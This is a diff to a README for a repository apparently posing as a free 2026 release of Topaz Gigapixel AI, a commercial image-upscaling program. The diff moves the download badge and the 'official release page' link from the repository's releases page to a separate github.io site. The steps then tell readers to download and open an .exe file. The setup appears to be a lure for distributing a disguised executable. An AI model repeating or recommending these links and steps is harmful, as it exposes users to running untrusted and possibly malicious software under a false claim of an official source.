@@ -1,6 +1,6 @@
 # 🖼️ Topaz-Gigapixel-AI-2026 - Improve image quality with artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Westbrooknorthkorean647/Topaz-Gigapixel-AI-2026/releases)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://westbrooknorthkorean647.github.io)
 
 ## 🎯 About This Software
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware to run this software well. Check your syst
 
 Follow these steps to put the software on your computer.
 
-1.  Visit the official release page: [https://github.com/Westbrooknorthkorean647/Topaz-Gigapixel-AI-2026/releases](https://github.com/Westbrooknorthkorean647/Topaz-Gigapixel-AI-2026/releases).
+1.  Visit the official release page: [https://westbrooknorthkorean647.github.io](https://westbrooknorthkorean647.github.io).
 2.  Find the file name ending in .exe in the Assets section.
 3.  Click the file name to start the download.
 4.  Open your Downloads folder once the transfer finishes.
